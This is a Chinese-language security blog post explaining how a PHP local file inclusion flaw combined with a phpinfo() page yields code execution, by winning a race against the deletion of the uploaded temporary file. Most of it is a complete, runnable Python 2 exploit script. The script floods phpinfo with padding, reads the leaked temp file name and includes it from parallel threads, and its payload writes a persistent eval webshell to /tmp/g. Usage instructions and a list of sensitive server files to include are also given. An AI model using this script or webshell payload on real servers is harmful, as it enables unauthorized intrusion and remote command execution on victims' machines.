---
layout: default
category: Web安全
tags: [条件竞争,文件包含]
---
> IFI（local file include）本地文件包含。由于包含的文件参数用户是可控的，黑客通过包含非PHP执行文件，如构造包含PHP代码的图片木马、临时文件、session文件、日志等来达到执行PHP代码的目的。根据服务器的配置可以查看其他文件

* /proc/self/environ  （进程的当前环境）
* /proc/self/fd/
* /var/log... 
* /var/lib/php/session (PHP sessions)
* /tmp  (PHP sessions)
* php://input wrapper
* php://filter wrapper
* data:// wrapper
* file:///   读取本地文件

但文件包含的难点在于文件的路径改怎么去寻找，下面这篇文章是研究利用文件包含结合phpinfo()来实现代码执行。

## 0x00 上传PHP文件

如果在PHP配置文件中设置了file_uploads = on，那么PHP将接受任何PHP文件的文件上传。上传文件将存储在t临时文件tmp位置,即服务器会将上传的文件存放在临时文件里，直到php脚本执行完后删除。

当我们上传一个文件时，php解析的处理步骤：

1. 请求到达
2. 创建临时文件，并写入上传文件（通常是`/tmp/php[6个随机字符]`）
3. 调用相应的PHP脚本进行处理，如检验名称、大小等；
4. 删除临时文件

参考：http://www.php.net/manual/en/features.file-upload.post-method.php

## 0x01 phpinfo

什么是phpinfo？`phpInfo()`的输出包含PHP变量的值，包括通过_GET，_POST或上传的FILES设置的任何值。上面的临时文件名可以在 `$FILES` 变量中找到。这个临时文件，在请求结束后就会被删除。phpinfo页面会将当前请求上下文中所有变量都打印出来。我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$FILES`变量的内容，自然也包含临时文件名。

## 0x02 **分块传输编码：**

分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。

HTTP分块传输编码允许服务器为动态生成的内容维持HTTP持久链接。

**格式：** 

如果一个HTTP消息（请求消息或应答消息）的`Transfer-Encoding`消息头的值为`chunked`，那么，消息体由数量未定的块组成，并以最后一个大小为0的块为结果。每一个非空的块都以该块包含数据的[字节](https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82)数（字节数以[十六进制](https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6)表示）开始，跟随一个CRLF （[回车](https://zh.wikipedia.org/wiki/%E5%9B%9E%E8%BB%8A%E9%8D%B5)及[换行](https://zh.wikipedia.org/wiki/%E6%8F%9B%E8%A1%8C)），然后是数据本身，最后块CRLF结束。在一些实现中，块大小和CRLF之间填充有白空格（0x20）。

最后一块是单行，由块大小（0），一些可选的填充白空格，以及CRLF。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。

消息最后以CRLF结尾。

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked

25
This is the data in the first chunk

1C
and this is the second one

3
con

8
sequence

0
```

参考：https://zh.wikipedia.org/wiki/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81

## 0x03 漏洞利用

首先漏洞利用的条件必须满足条件：

* LFI漏洞

  存在本地包含漏洞

* phpinfo()

  phpinfo()函数会将上传的临时文件名输出到页面，的功能在大多数情况下，这将是/phpinfo.php

在文件包含漏洞中，找不到可利用的文件时，可以利用phpinfo获取文件名，然后包含它。

文件包含漏洞和phpinfo() 页面通常是两个页面，我们需要先发送数据包给phpinfo页面，然后从返回页面中找到临时文件名，再将这个文件名发送给文件包含漏洞的页面，进行getshell。

但是在第一个请求结束时，临时文件名将被删除，第二个请求就无法被包含。所以我们需要用到条件竞争：

1. 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据
2. 因为phpinfo页面会将所有的数据打印出来，1中的垃圾数据会将整个phpinfo页面撑的非常大
3. php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
4. 所以，我们直接操作socket，每次读取4096个字节。只要读到的字符里包含临时文件名，就立刻发送第二个数据包。
5. 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
6. 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

**利用过程：**

1. 首先确认服务器有phpinfo()和存在文件包含:

   ![1543937153772](https://github.com/threeworld/threeworld.github.io/blob/master/images/1543937129(1).jpg?raw=true)



   ![1543937043(1)]({{site.url}}/images/1543937043(1).jpg)

2. 利用脚本exp_lfi.py实现了上述过程，成功包含临时文件后，会执行`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。

   ```
   python2 exp_lfi.py ip port threadnum
   ```

   ![1543937873(1)]({{site.url}}/images/1543937873(1).jpg)

3. 执行系统命令


![1543938129(1)]({{site.url}}/images/1543938129(1).jpg)

exp.py:

```python
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

## 0x00 后记

当然漏洞利用的环境比较苛刻，但思路还是很不错的。



参考：

http://www.cnblogs.com/littlehann/p/3665062.html

http://www.myh0st.cn/index.php/archives/494/

https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf

https://www.exploit-db.com/docs/40992

